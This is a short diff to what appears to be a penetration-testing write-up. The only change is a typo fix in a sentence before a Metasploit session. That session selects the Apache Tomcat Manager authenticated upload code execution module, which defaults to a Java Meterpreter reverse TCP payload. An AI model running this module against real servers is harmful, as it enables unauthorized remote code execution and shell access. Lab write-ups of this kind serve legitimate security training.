@@ -346,7 +346,7 @@ Interact with a module by name or index. For example info 5, use 5 or use auxili
 msf6 > 
 ```
 
-We have an authenticated user to let's go for 2 (Apache Tomcat Manager Authenticated Upload Code Execution)
+We have an authenticated user so let's go for 2 (Apache Tomcat Manager Authenticated Upload Code Execution)
 ```
 msf6 > use 2
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
